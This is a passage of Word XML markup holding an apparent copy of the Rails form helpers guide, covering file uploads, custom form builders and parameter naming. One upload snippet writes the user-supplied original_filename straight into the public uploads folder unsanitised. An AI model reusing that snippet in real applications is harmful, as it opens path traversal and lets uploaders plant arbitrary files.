          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>original_filename</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> attribute containing the name the file had on the user’s computer and a </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>content_type</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> attribute containing the MIME type of the uploaded file. The following snippet saves the uploaded content in </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>#{Rails.root}/public/uploads</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> under the same name as the original file (assuming the form was the one in the previous example).</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1E9CB791" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B2111E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def</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>upload</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EB8497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uploaded_io = params[:person][:picture]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EE855A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File.open(Rails.root.join('public', 'uploads', uploaded_io.original_filename), 'w') do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|file|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="022B545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file.write(uploaded_io.read)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53506C6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4F5C2FA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7D3AFB5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Once a file has been uploaded, there are a multitude of potential tasks, ranging from where to store the files (on disk, Amazon S3, etc) and associating them with models to resizing image files and generating thumbnails. The intricacies of this are beyond the scope of this guide, but there are several libraries designed to assist with these. Two of the better known ones are </w:t>
      </w:r>
      <w:hyperlink r:id="rId309" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>CarrierWave</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:hyperlink r:id="rId310" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Paperclip</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC9CF6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If the user has not selected a file the corresponding parameter will be an empty string.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B26EB01"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5.2 Dealing with Ajax</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F12428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Unlike other forms making an asynchronous file upload form is not as simple as providing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with </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:remote =&gt; true</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. With an Ajax form the serialization is done by JavaScript running inside the browser and since JavaScript cannot read files from your hard drive the file cannot be uploaded. The most common workaround is to use an invisible iframe that serves as the target for the form submission.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A8E3119"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6 Customizing Form Builders</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFE44A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As mentioned previously the object yielded by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and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>fields_for</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is an instance of FormBuilder (or a subclass thereof). Form builders encapsulate the notion of displaying form elements for a single object. While you can of course write helpers for your forms in the usual way you can also subclass FormBuilder and add the helpers there. For example</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5640"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3A91F089" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="549C99D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form_for @person</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r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16C627B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text_field_with_label f, :first_name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4AEE7F2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0BC5960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can be replaced with</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7680"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="62C795D3" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="361977B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form_for @person, :builder</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; LabellingFormBuilder do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A1273E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f.text_field :first_name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00F56F9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1DCBBDE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by defining a LabellingFormBuilder class similar to the following:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="16642D4E" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C41550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LabellingFormBuilder &lt; ActionView::Helpers::FormBuilder</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6168E9E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text_field(attribute, options={})</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10E136E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label(attribute) + super</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B031CE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317952A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1C2AC70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If you reuse this frequently you could define a </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>labeled_form_for</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper that automatically applies the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:builder =&gt; LabellingFormBuilder</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302137A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The form builder used also determines what happens when you do</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3240"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6680073D" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="05609D52" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1999072431"/>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render :partial</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; f %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="58A28EB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If </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is an instance of FormBuilder then this will render the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> partial, setting the partial’s object to the form builder. If the form builder is of class LabellingFormBuilder then the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>labelling_form</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> partial would be rendered instead.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F490CD7"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7 Understanding Parameter Naming Conventions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="607E8D9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As you’ve seen in the previous sections, values from forms can be at the top level of the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hash or nested in another hash. For example in a standard </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action for a Person model, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:model]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> would usually be a hash of all the attributes for the person to create. The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hash can also contain arrays, arrays of hashes and so on.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7209B81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Fundamentally HTML forms don’t know about any sort of structured data, all they generate is name–value pairs, where pairs are just plain strings. The arrays and hashes you see in your application are the result of some parameter naming conventions that Rails uses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E7F79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You may find you can try out examples in this section faster by using the console to directly invoke Racks’ parameter parser. For example,</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="16D777CE" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="531310C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Rack::Utils.parse_query "name=fred&amp;phone=0123456789"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D77C54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=&gt; {"name"=&gt;"fred", "phone"=&gt;"0123456789"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="631BD2DB"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7.1 Basic Structures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D74FE2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two basic structures are arrays and hashes. Hashes mirror the syntax used for accessing the value in </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. For example if a form contains</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6B1DED2A" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C476C98" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1934126841"/>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id="person_name"</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name="person[name]"</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value="Henry"/&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="76205E5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hash will contain</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3960"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6EED806E" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="52CF1F38" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="550193111"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>{'person' =&gt; {'name' =&gt; 'Henry'}}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2864FB0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and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:person][:name]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> will retrieve the submitted value in the controller.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44FF8AD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Hashes can be nested as many levels as required, for example</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224C4562" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1A7F577E" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1257714125"/>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id="person_address_city"</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name="person[address][city]"</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value="New York"/&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="630E747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will result in the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hash being</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6120"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6E2C8607" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C96544B" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1524704053"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>{'person'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
